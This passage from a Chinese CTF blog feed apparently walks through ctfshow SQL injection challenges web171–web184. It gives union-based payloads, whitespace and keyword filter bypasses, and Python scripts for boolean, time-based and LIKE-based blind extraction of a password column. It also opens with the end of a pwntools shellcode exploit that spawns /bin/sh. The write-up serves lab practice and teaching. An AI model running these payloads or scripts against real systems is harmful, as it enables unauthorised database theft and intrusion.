class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>,<span class="hljs-number">53436</span>)<br><br>shellcode=<span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-sql注入</title>
    <link href="/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。</p><h2 id="web171"><a class="markdownIt-Anchor" href="#web171"></a> web171</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1--+</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">根据id = &#x27;&quot;.$ GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;<br>传入的内容拼接就相当于<br>id=&#x27;1&#x27; or 1=1--+&#x27;limit 1;<br></code></pre></td></tr></table></figure><p>进行了简单的sql绕过</p><h2 id="web172"><a class="markdownIt-Anchor" href="#web172"></a> web172</h2><p>本地加入了返回逻辑，详细可以自己查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,database()%23</span><br></code></pre></td></tr></table></figure><p>首先爆看看库名，发现了<code>ctfshow_web</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再对所有可能的表进行爆列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再进行爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user2%23</span><br></code></pre></td></tr></table></figure><p>最后直接定位到password进行了</p><h2 id="web173"><a class="markdownIt-Anchor" href="#web173"></a> web173</h2><p>先用上题的最后payload查看看看，发现not_here,看一下本题的返回逻辑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>发现有个<code>ctfshow_user3</code>，直接写最后的payload，本题有匹配flag的过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user3%23</span><br></code></pre></td></tr></table></figure><h2 id="web174"><a class="markdownIt-Anchor" href="#web174"></a> web174</h2><p>在前面的基础上过滤了<code>0-9</code></p><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><p>利用replace就行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;B&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;C&#x27;</span>),<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;D&#x27;</span>),<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;E&#x27;</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;F&#x27;</span>),<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;G&#x27;</span>),<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;H&#x27;</span>),<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;I&#x27;</span>),<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;J&#x27;</span>);<br></code></pre></td></tr></table></figure><p>讲数字用字母进行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#x27;</span>A<span class="hljs-string">&#x27;),2,&#x27;</span>B<span class="hljs-string">&#x27;),3,&#x27;</span>C<span class="hljs-string">&#x27;),4,&#x27;</span>D<span class="hljs-string">&#x27;),5,&#x27;</span>E<span class="hljs-string">&#x27;),6,&#x27;</span>F<span class="hljs-string">&#x27;),7,&#x27;</span>G<span class="hljs-string">&#x27;),8,&#x27;</span>H<span class="hljs-string">&#x27;),9,&#x27;</span>I<span class="hljs-string">&#x27;),0,&#x27;</span>J<span class="hljs-string">&#x27;),&#x27;</span>b<span class="hljs-string">&#x27; from ctfshow_user4 where username=&#x27;</span>flag<span class="hljs-string">&#x27; %23</span><br></code></pre></td></tr></table></figure><p>得到的flag需要进行替换</p><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><p>利用盲注得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 构造 Payload</span><br>payload = <span class="hljs-string">&quot;1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span><br>url = <span class="hljs-string">&quot;http://17641de3-ec90-4f5e-a197-d6bcfc72684d.challenge.ctf.show/api/v4.php?id=&quot;</span><br><br><span class="hljs-comment"># 测试字符是否大于给定的 ASCII 值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_chr</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, offset: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url + payload.<span class="hljs-built_in">format</span>(index, offset), timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-comment"># 检查返回内容是否包含关键字</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cluster&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;boom&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Unexpected response for index <span class="hljs-subst">&#123;index&#125;</span>, offset <span class="hljs-subst">&#123;offset&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Request failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 开始盲注过程</span><br>index = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>max_length = <span class="hljs-number">50</span>  <span class="hljs-comment"># 假设flag最大长度</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(flag) &lt; max_length:<br>    start = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span>  <span class="hljs-comment"># ASCII 可打印字符范围</span><br>    <span class="hljs-keyword">while</span> start &lt; end:<br>        point = (start + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> test_chr(index, point):<br>            start = point + <span class="hljs-number">1</span>  <span class="hljs-comment"># 搜索更大的 ASCII 范围</span><br>        <span class="hljs-keyword">else</span>:<br>            end = point  <span class="hljs-comment"># 搜索更小的 ASCII 范围</span><br>    <span class="hljs-keyword">if</span> start == <span class="hljs-number">32</span>:  <span class="hljs-comment"># 当 start 等于 32 时，意味着没有更多字符</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Finished, flag is: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    flag += <span class="hljs-built_in">chr</span>(start)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>需要先找到接口，输入，最后跑一下脚本</p><h2 id="web175"><a class="markdownIt-Anchor" href="#web175"></a> web175</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>)))<br></code></pre></td></tr></table></figure><p>匹配 ASCII 码表范围内的字符也就是说 字母 数字 符号都显示不出来了，猜测是时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(3)%23</span><br></code></pre></td></tr></table></figure><p>可以正常运行，写个脚本跑看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://89f1ac82-1428-42c3-9b7a-0c3e5bbdc93c.challenge.ctf.show/api/v5.php?id=&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">f&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(3),0) %23&quot;</span><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            res = requests.get(url+payload)<br>            stop_time = time.time()<br>            <span class="hljs-keyword">if</span> stop_time - start_time &gt;= <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续推测字符，可能到达结尾或出错。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>觉得时间长的话可以微调一下时间间隔，不要过短</p><h2 id="web176"><a class="markdownIt-Anchor" href="#web176"></a> web176</h2><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><p>直接爆出来了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or  1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><p>可以bp来fuzz一下，union，select这些被过滤了，这题可以用大小写过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,database()%23</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,password from ctfshow_user%23</span><br></code></pre></td></tr></table></figure><h2 id="web177"><a class="markdownIt-Anchor" href="#web177"></a> web177</h2><p>可以fuzz一下,这里比较懒我直接看wp了，这里过滤了空格，在sql里可以用<code>/**/</code>来代替空格</p><h3 id="0x01-3"><a class="markdownIt-Anchor" href="#0x01-3"></a> 0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a class="markdownIt-Anchor" href="#0x02-3"></a> 0x02</h3><p>常规做法的最后一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h2 id="web178"><a class="markdownIt-Anchor" href="#web178"></a> web178</h2><p>本题还是过滤了空格，但上题的做法也被过滤了，<code>+</code>也被过滤了，这里可以联想到命令执行的一些空格绕过</p><h3 id="0x01-4"><a class="markdownIt-Anchor" href="#0x01-4"></a> 0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09or%091=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a class="markdownIt-Anchor" href="#0x02-4"></a> 0x02</h3><p>也是常规做法的最后一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h2 id="web179"><a class="markdownIt-Anchor" href="#web179"></a> web179</h2><p>同样是空格过滤</p><h3 id="0x01-5"><a class="markdownIt-Anchor" href="#0x01-5"></a> 0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a class="markdownIt-Anchor" href="#0x02-5"></a> 0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><h3 id="0x03"><a class="markdownIt-Anchor" href="#0x03"></a> 0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)%23</span><br></code></pre></td></tr></table></figure><h2 id="web180"><a class="markdownIt-Anchor" href="#web180"></a> web180</h2><p>同样是空格过滤，尝试了一下179的payload发现都不能成功，欸？最后过滤的要换一下的原因</p><h3 id="0x01-6"><a class="markdownIt-Anchor" href="#0x01-6"></a> 0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a class="markdownIt-Anchor" href="#0x02-6"></a> 0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x03-2"><a class="markdownIt-Anchor" href="#0x03-2"></a> 0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)--%0c</span><br></code></pre></td></tr></table></figure><h2 id="web181"><a class="markdownIt-Anchor" href="#web181"></a> web181</h2><p>给了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><h3 id="0x01-7"><a class="markdownIt-Anchor" href="#0x01-7"></a> 0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a class="markdownIt-Anchor" href="#0x02-7"></a> 0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(id=26)and&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>x1✌的简述，and 的优先级是高于 or 的，会执行后面的,下面<strong>贴原文</strong>，挺好理解的</p><p>语句实际的执行顺序如下 (我们把距离 and 两边最近的相关操作都用括号括起来以便于理解, 并且补全空格)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> (username <span class="hljs-operator">!=</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span>) <span class="hljs-keyword">or</span> (id<span class="hljs-operator">=</span><span class="hljs-number">26</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>) limit <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>首先因为输出只能输出一行数据, 需要 <code>id=-1</code> 来使前一条查询纪录为空, 使得前一条包含 and 的语句为 false</p><p>然后开始判断后一个括号内的操作, <code>id=26 and '1'</code> 与 <code>id=26</code> 等价 (注意 <code>id=26 or '1'</code> 相当于查询全部内容, 因为 or 后一句永远是 true, 即查询存在的纪录)</p><p>因为前一个括号内容不成立(返回空纪录), 后一个括号内的内容成立, 于是通过 or 符号, 我们查询了 <code>id=26</code> 的纪录并显示出来</p><p>因为空格被过滤了, 所以使用 <code>()</code> 进行绕过, 测试可知 flag 所在账户的 id 值是 26, 于是构造 <code>or(id=26)</code> 来查询 id=26 的数据</p><p>最后面的 <code>and'1</code> 是闭合后面的单引号 (因为注释被过滤掉了)</p><p>最终的 payload 为 <code>-1'or(id=26)and'1</code>, 其实 <code>-1'or(id=26)and'1'=1</code> 也是可以的</p><h2 id="web182"><a class="markdownIt-Anchor" href="#web182"></a> web182</h2><p>同web181,自己参照</p><h2 id="web183"><a class="markdownIt-Anchor" href="#web183"></a> web183</h2><p>查找语句做了限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>是从from后来开始注入，没有直接的回显，需要写个盲注的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://3edbba86-cec1-4666-8bcc-39e839605a1c.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">current_flag</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        data = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>: <span class="hljs-string">f&quot;(ctfshow_user)where(pass)like(&#x27;<span class="hljs-subst">&#123;current_flag + char&#125;</span>%&#x27;)&quot;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url, data=data)<br>            <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;$user_count = 1&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    char = get_flag_char(flag)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> char == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续匹配字符，可能已到达结尾或发生错误。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web184"><a class="markdownIt-Anchor" href="#web184"></a> web184</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <br></code></pre></td></tr></table></figure><p>本题的主要多过滤了where,可以利用having进行绕过，配合group by一起使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://7d2f63f3-cdef-40f1-bb7b-c5865311ee95.challenge.ctf.show/select-waf.php&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">return</span> binascii.hexlify(string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>  